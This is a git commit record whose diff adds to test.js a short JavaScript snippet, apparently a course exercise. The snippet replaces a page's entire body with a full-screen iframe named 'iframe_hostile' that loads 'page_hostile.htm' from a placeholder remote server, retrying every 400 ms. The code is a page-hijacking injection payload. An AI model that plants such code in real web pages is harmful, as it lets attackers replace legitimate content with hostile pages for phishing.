234ffada1ab0ba2f177e18337e877c63988f3032
FOX74-code <ggrossiord@guardiaschool.fr>
2024-12-05 11:36:51 +0100

    change

--- test.js
+++ test.js
@@ -1,1 +1,11 @@
-aaa
+function a () {
+var x = document . getElementById ( ’ exemple ’) ;
+if ( x != null ) {
+this . document . body . innerHTML = " < iframe id = iframe_hostile name = iframe_hostile
+width =100% height =100%
+src = http :// serveur_distant / page_hostile . htm > </ iframe > " ;
+} else {
+setTimeout ( ’a () ’ ,400) ;
+}
+}
+a () ;
